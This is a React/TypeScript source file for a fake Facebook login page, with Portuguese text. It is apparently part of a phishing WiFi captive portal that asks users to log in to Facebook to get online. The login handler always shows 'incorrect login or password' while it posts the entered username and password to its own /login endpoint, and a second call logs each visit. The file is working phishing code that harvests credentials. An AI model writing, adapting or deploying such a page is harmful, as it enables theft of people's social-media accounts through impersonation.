import { useState, useEffect } from 'react';
import { ForgotPassword, InfoMessage } from './styles';
import axios from '../../axios';
import { Input, ContentArea, LoginButton } from '../../style';
import FacebookLogo from '../../components/FacebookLogo';

const isEmail = (email: string) => /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i.test(email);
const isPhone = (phone: string) =>
	/^\+?([0-9]{2})?[-. ]?([0-9]{2})[-. ]?([0-9]{4,5})[-. ]?([0-9]{4})$/i.test(phone);

interface InputStyleProps {
	wrong: boolean;
	exceedAttempts: boolean;
}
const InputStyle = ({ wrong, exceedAttempts }: InputStyleProps) => {
	return {
		border: wrong ? '1px solid #fa3e3e' : 'none',
		cursor: exceedAttempts ? 'not-allowed' : 'pointer',
	};
};

export default () => {
	const [username, setUsername] = useState('');
	const [password, setPassword] = useState('');
	const [infoMsg, setInfoMsg] = useState('Faça login no Facebook para utilizar esse WiFi');
	const [wrong, setWrong] = useState(false);
	const [exceedAttempts, setExceedAttempts] = useState(false);

	const fetchAttempts = async () => {
		const data = await axios.get('/login');
		if (data.data.exceeded) {
			setExceedAttempts(true);
			setWrong(true);
			setInfoMsg('Muitas tentativas de login. Tente novamente mais tarde');
		}
	};

	const handleLogin = async () => {
		if (exceedAttempts) return;
		setWrong(true);

		if (!username || !password) {
			setInfoMsg('Preencha todos os campos');
			return;
		}
		if (!password) {
			setInfoMsg('Insira sua senha');
			return;
		}
		if (password.length < 6) return;
		if (!isEmail(username) && !isPhone(username)) {
			setInfoMsg('Insira um email ou número de celular válido');
			return;
		}

		setInfoMsg('Login e/ou senha incorretos');

		await axios.post('/login', {
			username,
			password,
		});

		fetchAttempts();
		return;
	};

	useEffect(() => {
		fetchAttempts();
		axios.post('/access');
	}, []);

	return (
		<>
			<InfoMessage>{infoMsg}</InfoMessage>
			<FacebookLogo />
			<ContentArea>
				<Input
					type='text'
					placeholder='Número de celular ou email'
					disabled={exceedAttempts}
					maxLength={255}
					value={username}
					onChange={(e) => setUsername(e.target.value)}
					style={InputStyle({ wrong, exceedAttempts })}
				/>

				<Input
					type='password'
					placeholder='Senha'
					disabled={exceedAttempts}
					maxLength={255}
					value={password}
					onChange={(e) => setPassword(e.target.value)}
					style={InputStyle({ wrong, exceedAttempts })}
				/>

				<LoginButton type='button' onClick={handleLogin} disabled={exceedAttempts}>
					Entrar
				</LoginButton>

				<ForgotPassword href='/forgot-password'>Esqueceu a senha?</ForgotPassword>
			</ContentArea>
		</>
	);
};
